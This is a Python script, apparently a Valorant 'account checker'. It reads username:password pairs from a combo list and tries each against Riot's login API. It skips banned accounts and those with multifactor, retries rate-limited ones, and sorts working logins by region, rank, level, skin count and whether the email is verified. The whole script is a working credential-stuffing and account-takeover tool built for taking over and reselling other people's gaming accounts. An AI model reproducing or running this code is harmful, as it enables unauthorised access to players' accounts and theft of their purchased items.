from colorama import Fore, init
from urllib import request
from requests import session as sesh
from requests.adapters import HTTPAdapter
from ssl import PROTOCOL_TLSv1_2
from urllib3 import PoolManager
from tkinter import *
from collections import OrderedDict
from re import compile
import pandas
import requests
import time
import os
import ctypes


init(convert=True)

failed = 0
checked = 0
good = 0
timeban = 0
cant_use = 0
notexist = 0
rate = 0
verified = 0
unverified = 0
xds = []
eu = 0
na = 0
br = 0
kr = 0
latam = 0
ap = 0
errors = 0

verified = 0
trueverified = 0
ratelimit = 0

no_rank = 0
unranked = 0
iron = 0
bronze = 0
silver = 0
gold = 0
platinum = 0
diamond = 0
ascendant = 0
immortal = 0
radiant = 0


_1_9 = 0
_10_19 = 0
_20_29 = 0
_30_39 = 0
_40_49 = 0
_50_99 = 0
_100_150 = 0
_151 = 0

skinned = 0
no_skins = 0

class TLSAdapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False):
        self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block,
                                       ssl_version=PROTOCOL_TLSv1_2)
def center(var:str, space:int=None): # From Pycenter
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
    return "\n".join((' ' * int(space)) + var for var in var.splitlines())

def checker():
    global good, timeban, cant_use, notexist, rate, checked, verified, unverified, errors, failed, cpm1, cpm2, no_rank
    global skinned, no_skins, good, eu, na, br, kr, latam, ap, ratelimit, unranked, iron, bronze, silver, gold, platinum, diamond, ascendant, immortal, radiant, _1_9, _10_19, _20_29, _30_39, _40_49, _50_99, _100_150, _151
    white = {Fore.WHITE}
    file1 = open('combo.txt', "r", encoding='utf-8')
    lines = file1.readlines()
    with open("combo.txt", 'r+', encoding='utf-8') as e:
        ext = e.readlines()
        for line in ext:
            xd = line.split(":")[0].replace('\n', '')
            xds.append(xd)
    num = len(xds)
    for line in lines:
        username = line.split(":")[0].replace('\n', '')
        password = line.split(":")[1].replace('\n', '')
        ctypes.windll.kernel32.SetConsoleTitleW(f"vinh#0370")
        os.system("cls")
        text = ''' 
    ░██████╗░██╗░░░░░░░██╗░░███╗░░███╗░░██╗██╗░░██╗
    ██╔════╝░██║░░██╗░░██║░████║░░████╗░██║██║░░██║
    ╚█████╗░░╚██╗████╗██╔╝██╔██║░░██╔██╗██║███████║
    ░╚═══██╗░░████╔═████║░╚═╝██║░░██║╚████║██╔══██║
    ██████╔╝░░╚██╔╝░╚██╔╝░███████╗██║░╚███║██║░░██║
    ╚═════╝░░░░╚═╝░░░╚═╝░░╚══════╝╚═╝░░╚══╝╚═╝░░╚═╝'''
        colorr = ''
        for line in text.splitlines():
            colorr += (f"\u001b[32m {line}.\u001b[0m\n")
        print(colorr)
        print(f"{Fore.RESET}        ╔══════════════════════════════════════╗")
        print(f"{Fore.RESET}          Acc loaded       :       ({Fore.LIGHTGREEN_EX}{num}{Fore.RESET})")
        print(f"{Fore.RESET}          Checked          :       ({Fore.LIGHTYELLOW_EX}{checked}/{num}{Fore.RESET})")
        print(f"{Fore.RESET}          Good to use      :       ({Fore.LIGHTGREEN_EX}{good}{Fore.RESET})")	
        print(f"{Fore.RESET}          Cannot use       :       ({Fore.LIGHTRED_EX}{cant_use}{Fore.RESET})")
        print(f"{Fore.RESET}          Need recheck     :       ({Fore.LIGHTRED_EX}{failed}{Fore.RESET})")
        print(f"{Fore.RESET}          Ratelimited      :       ({Fore.LIGHTRED_EX}{ratelimit}{Fore.RESET})")        
        print(f"{Fore.RESET}          Full Access      :       ({Fore.LIGHTGREEN_EX}{unverified}{Fore.RESET})")
        print(f"{Fore.RESET}        ╠══════════════════════════════════════╣")
        print(f"{Fore.RESET}          0                :       ({Fore.LIGHTGREEN_EX}{no_skins}{Fore.RESET})")
        print(f"{Fore.RESET}          1-9              :       ({Fore.LIGHTGREEN_EX}{_1_9}{Fore.RESET})")
        print(f"{Fore.RESET}          10-19            :       ({Fore.LIGHTGREEN_EX}{_10_19}{Fore.RESET})")
        print(f"{Fore.RESET}          20-29            :       ({Fore.LIGHTGREEN_EX}{_20_29}{Fore.RESET})")
        print(f"{Fore.RESET}          30-39            :       ({Fore.LIGHTGREEN_EX}{_30_39}{Fore.RESET})")
        print(f"{Fore.RESET}          40-49            :       ({Fore.LIGHTGREEN_EX}{_40_49}{Fore.RESET})")
        print(f"{Fore.RESET}          50-99            :       ({Fore.LIGHTGREEN_EX}{_50_99}{Fore.RESET})")
        print(f"{Fore.RESET}          100-150          :       ({Fore.LIGHTGREEN_EX}{_100_150}{Fore.RESET})")
        print(f"{Fore.RESET}          151+             :       ({Fore.LIGHTGREEN_EX}{_151}{Fore.RESET})")
        print(f"{Fore.RESET}        ╠══════════════════════════════════════╣")
        print(f"{Fore.RESET}          No rank          :       ({Fore.LIGHTGREEN_EX}{no_rank}{Fore.RESET})")
        print(f"{Fore.RESET}          Unranked         :       ({Fore.LIGHTGREEN_EX}{unranked}{Fore.RESET})")
        print(f"{Fore.RESET}          Iron             :       ({Fore.LIGHTGREEN_EX}{iron}{Fore.RESET})")
        print(f"{Fore.RESET}          Bronze           :       ({Fore.LIGHTGREEN_EX}{bronze}{Fore.RESET})")
        print(f"{Fore.RESET}          Silver           :       ({Fore.LIGHTGREEN_EX}{silver}{Fore.RESET})")
        print(f"{Fore.RESET}          Gold             :       ({Fore.LIGHTGREEN_EX}{gold}{Fore.RESET})")
        print(f"{Fore.RESET}          Platium          :       ({Fore.LIGHTGREEN_EX}{platinum}{Fore.RESET})")
        print(f"{Fore.RESET}          Diamond          :       ({Fore.LIGHTGREEN_EX}{diamond}{Fore.RESET})")
        print(f"{Fore.RESET}          Ascendant        :       ({Fore.LIGHTGREEN_EX}{ascendant}{Fore.RESET})")
        print(f"{Fore.RESET}          Immortal         :       ({Fore.LIGHTGREEN_EX}{immortal}{Fore.RESET})")
        print(f"{Fore.RESET}          Radiant          :       ({Fore.LIGHTGREEN_EX}{radiant}{Fore.RESET})")
        print(f"{Fore.RESET}        ╠══════════════════════════════════════╣")
        print(f"{Fore.RESET}          EU               :       ({Fore.LIGHTGREEN_EX}{eu}{Fore.RESET})")
        print(f"{Fore.RESET}          NA               :       ({Fore.LIGHTGREEN_EX}{na}{Fore.RESET})")
        print(f"{Fore.RESET}          AP               :       ({Fore.LIGHTGREEN_EX}{ap}{Fore.RESET})")  
        print(f"{Fore.RESET}          KR               :       ({Fore.LIGHTGREEN_EX}{kr}{Fore.RESET})")
        print(f"{Fore.RESET}        ╚══════════════════════════════════════╝")        
        
        headers = OrderedDict({
            "Accept-Language": "en-US,en;q=0.9",
            "Accept": "application/json, text/plain, */*",
            'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)'
        })
        session = sesh()
        session.headers = headers
        session.mount('https://', TLSAdapter())
        data = {
            "acr_values": "urn:riot:bronze",
            "claims": "",
            "client_id": "riot-client",
            "nonce": "oYnVwCSrlS5IHKh7iI16oQ",
            "redirect_uri": "http://localhost/redirect",
            "response_type": "token id_token",
            "scope": "openid link ban lol_region",
        }
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
        }
        r = session.post(f'https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers)
        data = {
            'type': 'auth',
            'username': username,
            'password': password
        }
        r2 = session.put('https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers)
        data = r2.json()
        if "access_token" in r2.text:
            pattern = compile(
                'access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
            data = pattern.findall(data['response']['parameters']['uri'])[0]
            token = data[0]
        elif "auth_failure" in r2.text:
            checked += 1
            cant_use += 1
            continue
        elif "rate_limited" in r2.text:
            print(f"       Message: ratelimited 30s {username}:{password}")
            ratelimit += 1
            failed += 1
            rmtext = open("results//re_check.txt", "a+", encoding='utf-8')
            rmtext.write(f"{username}:{password}\n")
            rmtext.close()
            checked += 1
            time.sleep(30)
            continue
        elif 'multifactor' in r2.text:
            cant_use += 1
            checked += 1
            continue
        else:
            pattern = compile('access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
            data = pattern.findall(data['response']['parameters']['uri'])[0]
            token = data[0]
        headers = {
            'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
            'Authorization': f'Bearer {token}',
        }
        
        r = session.post('https://entitlements.auth.riotgames.com/api/token/v1', headers=headers, json={})
        entitlement = r.json()['entitlements_token']
        r = session.post('https://auth.riotgames.com/userinfo', headers=headers, json={})
        data = r.json()
 #check ban       
        try:
            GameName =  r.text.split('game_name":"')[1].split('"')[0]
        except:
            errors += 1
            continue                
        Tag = r.text.split('tag_line":"')[1].split('"')[0]  
        Sub = r.text.split('sub":"')[1].split('"')[0] 
        EmailVerified = r.text.split('email_verified":')[1].split('"')[0]
        data1 = data['acct']
        unix_time = data1['created_at']
        unix_time = int(unix_time)
        result_s = pandas.to_datetime(unix_time,unit='ms')
        str(result_s)        
        typebanned = None
        result_s1 = None       
        try:
            data = r.json()
            data2 = data['ban']
            data3 = data2['restrictions']
            for x in data3:
                typebanned = x['type']
            if typebanned == "PERMANENT_BAN":
                result_s1 = "Permantent"
                cant_use += 1
                checked += 1
                continue
            if typebanned == "PERMA_BAN":
                result_s1 = "Permantent"
                cant_use += 1
                checked += 1
                continue
            if typebanned == "TIME_BAN":
                cant_use += 1
                checked += 1
                continue
        except:
            checked += 1
            print("unknow error")
            sleep(2)
            continue
#get Region + Accountlvl
        try:
            url = (f"https://api.henrikdev.xyz/valorant/v1/account/{GameName}/{Tag}")
            r2 = requests.get(url)
            Region = r2.json()["data"]["region"]
            AccountLevel = r2.json()["data"]["account_level"]
        except:
            failed += 1
            failedtext = open("results//re_check.txt", "a+", encoding='utf-8')
            failedtext.write(f"{username}:{password}\n")
            failedtext.close()
            checked += 1
            continue     
        
        PvpNetHeaders = {"Content-Type": "application/json",
                        "Authorization": f"Bearer {token}",
                        "X-Riot-Entitlements-JWT": entitlement,
                        "X-Riot-ClientVersion": "release-01.08-shipping-10-471230",
                        "X-Riot-ClientPlatform": "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"
        }
#get last match
        try:
            url = (f"https://api.henrikdev.xyz/valorant/v3/matches/{Region}/{GameName}/{Tag}")
            r = requests.get(url)
            data = r.json()
            data2 = data["data"]
            for x in data2:
                data3 = x['metadata']
            last_time = data3["game_start_patched"]
        except:
            failed += 1
            failedtext = open("results//re_check.txt", "a+", encoding='utf-8')
            failedtext.write(f"{username}:{password}\n")
            failedtext.close()
            checked += 1
            continue
#get Rank + rr
        Rank = "No rank"
        try:
            url = (f"https://api.henrikdev.xyz/valorant/v1/mmr/{Region}/{GameName}/{Tag}")
            r = requests.get(url)
            Rank = r.json()["data"]["currenttierpatched"]
            rr = r.json()["data"]["ranking_in_tier"]
        except:
            failed += 1
            failedtext = open("results//re_check.txt", "a+", encoding='utf-8')
            failedtext.write(f"{username}:{password}\n")
            failedtext.close()
            checked += 1
            continue
            
        headers ={
        "X-Riot-Entitlements-JWT": entitlement,
        "Authorization": f"Bearer {token}"
        }
#get Skins
        r = requests.get(f"https://pd.{Region}.a.pvp.net/store/v1/entitlements/{Sub}/e7c63390-eda7-46e0-bb7a-a6abdacd2433",headers=headers)
        response_API = requests.get('https://raw.githubusercontent.com/xharky/Valorant-list/main/Skinlist.txt')
        response = response_API.text
        skinsList = response.splitlines()
        userSkins = []
        SkinStr = ""
        skins = r.json()["Entitlements"]
        for skin in skins:
            UidToSearch = skin['ItemID']
            for item in skinsList:
                details = item.split("|")
                namePart = details[0]
                idPart = details[1]
                name = namePart.split(":")[1]
                id = idPart.split(":")[0].lower()
                if id == UidToSearch:
                    userSkins.append(name)
                    SkinStr += "  ══ " + name + "\n"
        skin_amount = len(userSkins)
        skin_amount = int(skin_amount)
        category = "No skin"
        if skin_amount == 0:
            no_skins += 1
        elif skin_amount in range(1, 10):
            _1_9 += 1
            category = "1-9 skins"
        elif skin_amount in range(10, 20):
            _10_19 += 1
            category = "10-19 skins"
        elif skin_amount in range(20, 30):
            _20_29 += 1
            category = "20-29 skins"
        elif skin_amount in range(30, 40):
            _30_39 += 1
            category = "30-39 skins"
        elif skin_amount in range(40, 50):
            _40_49 += 1
            category = "40-49 skins"
        elif skin_amount in range(50, 100):
            _50_99 += 1
            category = "50-99 skins"
        elif skin_amount in range(100, 151):
            _100_150 += 1
            category = "100-150 skins"
        elif skin_amount in range(151,1001):
            _151 += 1
            category = "151-1000 skins"
        else:
            errors += 1
#GUI
        if Region == "eu":
            eu += 1
        elif Region == "na":
            na += 1
        elif Region == "kr":
            kr += 1
        elif Region == "ap":
            ap += 1
        elif Region == "latam":
            latam += 1
        elif Region == "br":
            br += 1
        if Rank is None:
            Rank = "No rank"
            Rank2 = "no rank"
        else:
            Rank2 = ''.join([i for i in Rank if not i.isdigit()]) 
            Rank2 = Rank2.lower()
        print(f"{Rank2}")
        if Rank2 == "no rank":
            no_rank += 1
        if Rank2 == "unranked":
            unranked += 1
        if Rank2 == "iron ":
            iron += 1
        if Rank2 == "silver ":
            silver += 1
        if Rank2 == "bronze ":
            bronze += 1
        if Rank2 == "gold ":
            gold += 1
        if Rank2 == "platinum ":
            platinum += 1
        if Rank2 == "diamond ":
            diamond += 1
        if Rank2 == "ascendant ":
            ascendant += 1
        if Rank2 == "immortal ":
            immortal += 1
        if Rank2 == "radiant ":
            radiant += 1
#output
        Region = Region.upper()
        roait = (f"╔═════════════════════════════════════════════════════╗\n  ══ User&Pass: {username}:{password}\n  ══ Game Name: {GameName}#{Tag}\n  ══ Region: {Region}\n  ══ NFA: {EmailVerified}\n  ══ Level: {AccountLevel}\n  ══ Rank: {Rank} ({rr})\n  ══ Last match: {last_time}\n  --------------------------------------------------\n  ══ Category: {category}\n  ══ Skins:({skin_amount})\n{SkinStr}╚═════════════════════════════════════════════════════╝\n\n")             
        checked += 1
        good += 1
        euwrite = open(f"results//{EmailVerified}//{Region}//{category}//{Rank}.txt", "a+", encoding='utf-8')
        euwrite.write(f"{roait}")
        euwrite.close
        euwrite = open(f"results//{EmailVerified}//{Region}//{category}//UserPass//{Rank}.txt", "a+", encoding='utf-8')
        euwrite.write(f"{username}:{password}\n")
        euwrite.close
checker()
